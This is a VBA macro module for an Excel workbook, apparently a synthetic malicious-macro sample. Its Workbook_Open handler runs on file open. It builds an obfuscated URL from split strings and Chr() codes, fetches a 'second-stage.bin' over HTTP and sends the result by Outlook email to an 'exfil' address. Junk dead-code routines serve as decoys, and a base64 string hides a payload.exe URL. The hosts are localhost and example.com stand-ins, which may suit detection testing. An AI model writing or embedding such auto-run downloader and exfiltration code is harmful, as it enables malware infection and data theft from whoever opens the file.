
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim lckhv437 As Object, url As String
    Dim xcx6ug6uo As Object, sarv21hmdtd5d As Object
    On Error Resume Next
    url = "lckh" & "v437" & "://1" & "27.0" & Chr(46) & Chr(48) & Chr(46) & Chr(49) & Chr(58) & Chr(57) & "090/s" & "econd-s" & "tage.bin"
    Set lckhv437 = CreateObject("MSXML2.XM" & "LHTTP")
    lckhv437.Open "GET", url, False
    lckhv437.Send
    Set xcx6ug6uo = CreateObject("Outloo" & "k.Applica" & "tion")
    Set sarv21hmdtd5d = xcx6ug6uo.CreateItem(0)
    sarv21hmdtd5d.To = "exfil@example.com"
    sarv21hmdtd5d.Subject = "logs"
    sarv21hmdtd5d.Body = lckhv437.Status
    sarv21hmdtd5d.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
